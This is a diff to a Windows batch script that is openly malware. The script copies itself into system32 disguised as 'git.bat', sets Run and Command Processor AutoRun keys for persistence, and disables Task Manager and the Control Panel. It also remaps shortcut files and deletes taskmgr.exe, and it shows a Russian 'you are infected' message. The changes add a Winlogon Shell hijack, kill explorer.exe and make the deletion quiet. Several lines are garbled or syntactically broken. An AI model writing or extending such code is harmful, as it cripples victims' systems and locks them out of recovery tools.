@@ -4,10 +4,14 @@ copy ""%0"" "%SystemRoot%\system32\git.bat"
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\git.bat" /f
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
 
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\git.bat" /f 
+
 Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
 color a
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f
+taskkill /im explorer.exe 
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\git.bat /f
 
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
 
@@ -25,7 +29,7 @@ assoc .lnk=.txt
 copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
 reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\git.bat" /f >nul
 
-Del C:\Windows\System32\taskmgr.exe
+Del C:\Windows\System32\taskmgr.exe /q
 
 msg * ТЫ ЗАРАЖЕН ТАСК МЕНЕДЖЕР УДАЛЕН ЖДИ 60 СЕКУЕТ СЕКУНД
 
@@ -57,8 +61,9 @@ start %systemdrive%\windows\system32\rundll32.vbs
 
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f 
 
+taskkill %0
 
-@echo off 
+
 echo Chr(39)>%temp%\temp1.vbs 
 echo Chr(39)>%temp%\temp2.vbs 
 echo on error resume next > %temp%\temp.vbs 
